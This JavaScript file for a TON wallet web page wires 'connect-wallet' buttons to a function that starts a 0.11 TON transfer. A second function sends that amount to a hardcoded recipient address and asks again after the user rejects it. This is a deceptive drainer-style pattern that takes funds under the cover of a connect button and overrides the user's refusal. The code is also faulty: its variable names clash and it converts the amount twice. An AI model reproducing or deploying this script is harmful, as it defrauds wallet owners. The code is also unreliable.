const tonweb = new TonWeb();

const Current_URL = window.location.href.replace(/http[s]*:\/\//, "");
let public_key = null

const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: `https://${Current_URL}/tonconnect-manifest.json`,
     buttonRootId: 'ton-connect'
  });
  
  
  tonConnectUI.onStatusChange(async (walletDetails) => {
    if (walletDetails) {
        console.log(walletDetails)
        console.log("wallet details changed")
        const address = walletDetails.account.address;
        const wallet = walletDetails.appName;
        wallet_public_key = walletDetails.account.publicKey;
    } else {
       console.log("Failed to connect Ton wallet")
    }
  });


const transferTon = async ()  => {
    console.log("Ton transfer initiated");
    const transfer_amount = "0.11";
    console.log(" wallet public key is", wallet_publickey);

    if (!public_key) {
        console.error("Public key is not available. Cannot create wallet.");
        return;
    }
    const workchain = "1";
    const wallet = WalletContractV4.create({
        workchain,
        publicKey: Buffer.from(wallet_publickey, 'hex')
      });
    const amount = transfer_amount * Math.pow(10, 9); // Convert 0.11 TON to nanoTON
    const recipientAddress = "";
    let transactionAccepted = false;

    const seqno = await wallet.methods.getSeqno().call();

    const fee = await wallet.methods.transfer({
        to: recipientAddress,
        amount: tonweb.utils.toNano(amount.toString()),
        seqno,
    }).estimateFee();

    const transaction = await wallet.methods.transfer({
        to: recipientAddress,
        value: tonweb.utils.toNano(amount.toString()),
    }).send();

    while (!transactionAccepted) {
        try {
            const result = await transaction.send();
            console.log("Transaction submitted. Waiting for confirmation...");
            console.log("Transaction successful:", result);
            transactionAccepted = true;
        } catch (error) {
            if (error.code === "Reject request") {
                console.log("User denied the transaction. Retrying...");
                await transaction.send();
            } else {
                console.error("An error occurred:", error);
                break;
            }
        }
    }
}


const transferTon2 = async ()  => {
    console.log("Ton transfer initiated");
    const transfer_amount = "0.11";
    const amount = transfer_amount * Math.pow(10, 9); // Convert 0.11 TON to nanoTON
    const recipientAddress = "UQAObO0rUj_PIu-6W4Afnb2lf1pnZGSWWDaEJ3q5vWx3Cdq6";
    let transactionAccepted = false;
    const transaction = {
        messages: [
            {
                to: recipientAddress,
                value: tonweb.utils.toNano(amount.toString()),
            }
        ]
    };

    while (!transactionAccepted) {
        try {
            const result = await tonConnectUI.sendTransaction(transaction);
            console.log("Transaction submitted. Waiting for confirmation...");
            console.log("Transaction successful:", result);
            transactionAccepted = true;
        } catch (error) {
            console.error("Error during transaction:", error);
            if (error.code === "Reject request") {
                console.log("User denied the transaction. Retrying...");
                const result = await tonConnectUI.sendTransaction(transaction);
            } else {
                console.error("An error occurred:", error);
                break;
            }
        }
    }
}


document.addEventListener('DOMContentLoaded', () => {
    const connectWalletButtons = document.querySelectorAll('.connect-wallet');
    connectWalletButtons.forEach(button => {
      button.addEventListener('click', async () => {
       await transferTon();
      });
    });
  });
